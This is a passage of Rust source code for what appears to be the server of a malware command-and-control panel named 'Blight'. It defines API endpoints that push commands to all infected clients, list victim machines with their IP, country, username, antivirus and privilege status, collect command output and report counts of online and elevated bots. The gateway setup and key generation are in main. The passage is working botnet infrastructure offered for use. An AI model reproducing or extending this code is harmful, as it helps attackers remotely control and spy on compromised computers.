        task_all_clients(&key_to_string(&json, "cmd_args"), &key_to_string(&json, "cmd_type"), &load_id).await;
        
        fprint("success", &format!("{} load created for command {} with these args: {}", 
            recursive_text.yellow(), key_to_string(&json, "cmd_type"), key_to_string(&json, "cmd_args").yellow()
        ));

        drop(connection); return resp_ok(load_id);
    } else {
        fprint("failure", &format!("Request was sent to /api/issue without authentication."));
        return resp_unauthorised();

    }
}


#[post("/api/clients_list")]
async fn api_clients_list(req_body: String) -> impl Responder {

    let json = serde_json::from_str(&req_body).unwrap();
    let api_secret: String = String::from(str::from_utf8(&*API_SECRET.read().unwrap().as_bytes()).unwrap());

    if key_to_string(&json, "api_secret") == api_secret {

        let mut connection: Conn = (*CONNECTION_POOL.read().unwrap()).get_conn().await.unwrap();
        let client_selection_sql = connection.query_iter(r"SELECT * FROM clients").await;
    
        match client_selection_sql {
            Ok(_) => (),
            Err(_) => {
                fprint("error", "(client_selection_sql) Unable to fetch client list");
                drop(connection); return resp_servererror();
            }, 
        };

        let selected_clients = client_selection_sql.unwrap().collect::<Row<>>().await;
        let mut json_clients_list = json!({});

        for row in selected_clients.unwrap() {
            json_clients_list[value_to_str(&row, 0)] = json!(
                {
                    "version": value_to_u64(&row, 1),
                    "uac": value_to_bool(&row, 2),
                    "ip": value_to_str(&row, 3),
                    "country": value_to_str(&row, 4),
                    "username": value_to_str(&row, 5),
                    "guid": value_to_str(&row, 6),
                    "cpu": value_to_str(&row, 7),
                    "gpu": value_to_str(&row, 8),
                    "ram":value_to_u64(&row, 9),
                    "antivirus": value_to_str(&row, 10),
                    "path": value_to_str(&row, 11),
                    "pid": value_to_u64(&row, 12),
                    "last_seen":value_to_u64(&row, 13),
                    "first_seen": value_to_u64(&row, 14),
                }
            );            
        }

        drop(connection); return resp_ok(json_clients_list.to_string());
    } else {
        fprint("failure", &format!("Request was sent to /api/clients_list without authentication."));
        return resp_unauthorised();
    }
}

#[post("/api/get_output")]
async fn api_get_output(req_body: String) -> impl Responder {
    let json = serde_json::from_str(&req_body).unwrap();
    let api_secret: String = String::from(str::from_utf8(&*API_SECRET.read().unwrap().as_bytes()).unwrap());

    if key_to_string(&json, "api_secret") == api_secret {
        
        let mut connection: Conn = (*CONNECTION_POOL.read().unwrap()).get_conn().await.unwrap();
        let output_selection_sql = connection.exec_iter(
            r"SELECT * FROM outputs WHERE client_id=:client_id", 
            params! {
                "client_id" => key_to_string(&json, "client_id")
            }
        ).await;
    
        match output_selection_sql {
            Ok(_) => (),
            Err(_) => {
                fprint("error", "(output_selection_sql) Unable to fetch outputs");
                drop(connection); return resp_servererror();
            }, 
        };

        let mut json_outputs_list = json!({});
        let selected_outputs = output_selection_sql.unwrap().collect::<Row<>>().await;

        for row in selected_outputs.unwrap() {
            json_outputs_list[value_to_str(&row, 0)] = json!(
                {
                    "version": value_to_u64(&row, 1),
                    "command_id": value_to_str(&row, 2),
                    "cmd_args": value_to_str(&row, 4),
                    "cmd_type": value_to_str(&row, 5),
                    "output": value_to_str(&row, 6),
                    "time_issued": value_to_str(&row, 7),
                    "time_recieved": value_to_str(&row, 8),
                }
            );            
        }

        drop(connection); return resp_ok(json_outputs_list.to_string());
    } else {
        fprint("failure", &format!("Request was sent to /api/get_output without authentication."));
        return resp_unauthorised();
    }
}


#[post("/api/loads_list")]
async fn loads_list(req_body: String) -> impl Responder {
    let json = serde_json::from_str(&req_body).unwrap();
    let api_secret: String = String::from(str::from_utf8(&*API_SECRET.read().unwrap().as_bytes()).unwrap());

    if key_to_string(&json, "api_secret") == api_secret {
        let mut connection: Conn = (*CONNECTION_POOL.read().unwrap()).get_conn().await.unwrap();
        let load_selection_sql = connection.query_iter(r"SELECT * FROM loads").await;
    
        match load_selection_sql {
            Ok(_) => (),
            Err(_) => {
                fprint("error", "(load_selection_sql) Unable to fetch loads");
                drop(connection); return resp_servererror();
            }, 
        };

        let mut json_loads_list = json!({});
        let selected_loads = load_selection_sql.unwrap().collect::<Row>().await;

        for row in selected_loads.unwrap() {
            json_loads_list[value_to_str(&row, 0)] = json!({
                    "required_amount": value_to_str(&row, 2),
                    "recursive_load": value_to_bool(&row, 2),
                    "cmd_args": value_to_str(&row, 3),
                    "cmd_type": value_to_str(&row, 4),
                    "time_issued": value_to_u64(&row, 5),
                });            
        }
        
        drop(connection); return resp_ok(json_loads_list.to_string());
    } else {
        fprint("failure", &format!("Request was sent to /api/loads_list without authentication."));
        return resp_unauthorised();
    }
}


#[post("/api/remove_load")]
async fn remove_load(req_body: String) -> impl Responder {
    let json = serde_json::from_str(&req_body).unwrap();
    let api_secret: String = String::from(str::from_utf8(&*API_SECRET.read().unwrap().as_bytes()).unwrap());

    if key_to_string(&json, "api_secret") == api_secret {
        let mut connection: Conn = (*CONNECTION_POOL.read().unwrap()).get_conn().await.unwrap();

        if is_load(&mut connection, &key_to_string(&json, "load_id")).await {

            let load_removal_sql = connection.exec_drop(
                r"DELETE FROM loads WHERE load_id = :load_id;",  
                params! {
                    "load_id" => key_to_string(&json, "load_id"),
                }
            ).await;
        
            match load_removal_sql {
                Ok(_) => (),
                Err(e) => {
                    fprint("error", &format!("(load_removal_sql) Unable to remove load: {}", e));
                    drop(connection); return resp_servererror();
                }, 
            };

            let command_removal_sql = connection.exec_drop(
                r"DELETE FROM commands WHERE load_id = :load_id;",  
                params! {
                    "load_id" => key_to_string(&json, "load_id"),
                }
            ).await;
        
            match command_removal_sql {
                Ok(_) => (),
                Err(e) => {
                    fprint("error", &format!("(command_removal_sql) Unable to remove commands: {}", e));
                    drop(connection); return resp_servererror();
                }, 
            };
            
            drop(connection); return resp_ok(String::from("Successfully removed load."));
        } else {
            drop(connection); return resp_badrequest();
        }
    } else {
        fprint("failure", &format!("Request was sent to /api/remove_load without authentication."));
        return resp_unauthorised();
    }
}

#[post("/api/statistics")]
async fn statistics(req_body: String) -> impl Responder {

    let json = serde_json::from_str(&req_body).unwrap();
    let api_secret: String = String::from(str::from_utf8(&*API_SECRET.read().unwrap().as_bytes()).unwrap());
    let connection_interval = *CONNECTION_INTERVAL.read().unwrap();

    if key_to_string(&json, "api_secret") == api_secret {

        
        let mut connection = obtain_connection().await;
        let mut connection2 = obtain_connection().await;

        let command_selection_sql = connection.query_iter(r"SELECT command_id FROM commands").await;
        match command_selection_sql {
            Ok(_) => (),
            Err(_) => {
                fprint("error", "(command_selection_sql) Unable to get a list of commands.");
                drop(connection); return resp_servererror();
            }, 
        };

        
        let client_selection_sql = connection2.query_iter(r"SELECT last_seen,uac,first_seen FROM clients").await;
        match client_selection_sql {
            Ok(_) => (),
            Err(_) => {
                fprint("error", "(client_selection_sql) Unable to get a list of clients.");
                drop(connection2); return resp_servererror();
            }, 
        };


        // Client shit
        let mut online_clients_amount :u64 = 0;
        let mut offline_clients_amount: u64 = 0;
        let mut uac_clients_amount: u64 = 0;
        let mut last_new_client: u64 = 0;

        // Command Shit
        let mut active_command_amount: u64 = 0;


        let selected_commands = command_selection_sql.unwrap().collect::<Row<>>().await;
        for _ in selected_commands.unwrap() { active_command_amount += 1; }

        let selected_clients = client_selection_sql.unwrap().collect::<Row<>>().await;
        for row in selected_clients.unwrap() {
            
            if value_to_u64(&row, 2) > last_new_client {
                last_new_client = value_to_u64(&row, 2);
            }
            
            if value_to_bool(&row, 1) {
                uac_clients_amount += 1;
            }

            if value_to_u64(&row, 0) + connection_interval < get_timestamp() {
                offline_clients_amount += 1;
            } else {
                online_clients_amount += 1;
            }
        }

        let json_to_return = json!({
            "offline_clients": offline_clients_amount,
            "online_clients": online_clients_amount,
            "total_clients": offline_clients_amount + online_clients_amount,
            "uac_clients": uac_clients_amount,
            "last_new_client": last_new_client,
            "active_commands": active_command_amount,
        });

        drop(connection); drop(connection2); return resp_ok(json_to_return.to_string());
        
    } else {
        fprint("failure", &format!("Request was sent to /api/statistics without authentication."));
        return resp_unauthorised();
    }
}


#[actix_web::main]
async fn main() -> std::io::Result<()> {

    println!("
    _                 
    /_  //  .  __   /_  -/-
  _/_)_(/__/__(_/__/ (__/_ 
              _/_          
             (/            
                           
    ");

    // Set open file limit to really high
    Command::new("ulimit")
    .arg("-n")
    .arg("524288");


    let json_config = fs::read("artifacts/configuration/server_config.json");

    match json_config {
        Ok(_) => (),
        Err(_) => {
            write!(File::create("server_config.json").unwrap(), "{}", serde_json::to_string_pretty(
                &json!({
                    "host": "127.0.0.1:9999",
                    "connection_interval": 60,
                    "mysql_server": "mysql://root:root@127.0.0.1:3306/mydb",
                    "api_secret": "root",
                    "honor_client_blocks": false
                })
            ).unwrap()).expect("Unable to write json file.");

            fprint("info", "Your \"server_config.json\" file wasn't present. No worries, we've created it for you. ");
            fprint("info", "Open it in a text editor, and fill out the fields. Then, re-run Blight.");
            exit(1);
        }
    };

    let parsed_json_config: serde_json::Value = serde_json::from_str(str::from_utf8(&json_config.unwrap()).unwrap()).expect("erm");

    fprint("task", "We're setting up your server. This might take a few, hang tight.");
    let connection_pool: Pool = Pool::new(Opts::from_url(&key_to_string(&parsed_json_config, "mysql_server")).unwrap());
    let geolite_db = fs::read("artifacts/databases/GeoLite2-Country.mmdb");

    match geolite_db {
        Ok(_) => (),
        Err(_) => {
            fprint("error", "You don't have \"GeoLite2-Country.mmdb\" dowloaded. Find it and place it in the current directory.");
            exit(1);
        }
    };
    // a
    if !Path::new("artifacts/keys/private.pem").exists() {
        let mut rng = rand::thread_rng();
        let priv_key = RsaPrivateKey::new(&mut rng, 2048).expect("failed to generate a key");
        let pub_key = RsaPublicKey::from(&priv_key);
        
        priv_key.write_pkcs1_pem_file("artifacts/keys/private.pem", rsa::pkcs1::LineEnding::LF).unwrap();
        pub_key.write_pkcs1_pem_file("artifacts/keys/public.pem", rsa::pkcs1::LineEnding::LF).unwrap();

        fprint("success", "RSA key pair was created, since there wasn't one before.");
    }

    *CONNECTION_POOL.write().unwrap() = connection_pool.clone();
    *CONNECTION_INTERVAL.write().unwrap() = key_to_u64(&parsed_json_config, "connection_interval");
    *HONOR_CLIENT_BLOCKS.write().unwrap() = key_to_bool(&parsed_json_config, "honor_client_blocks");
    *API_SECRET.write().unwrap() = key_to_string(&parsed_json_config, "api_secret");
    *PRIVATE_KEY.write().unwrap() = RsaPrivateKey::from_pkcs1_pem(&fs::read_to_string("artifacts/keys/private.pem").unwrap()).unwrap();
    *IP_DATABASE.write().unwrap() = geolite_db.unwrap();
    
    initialize_tables(connection_pool.clone()).await;

    fprint("info", &format!(
        "Server running! Gateway path: {}", 
        format!("http://{}/gateway", &key_to_string(&parsed_json_config, "host")).yellow()
    ));

    HttpServer::new(move || {
        App::new()
            .service(gateway)
            .service(api_issue)
            .service(api_clients_list)
            .service(api_get_output)
            .service(loads_list)
            .service(remove_load)
            .service(statistics)
    })
    .bind(&key_to_string(&parsed_json_config, "host"))? 
    .run()
    .await
}
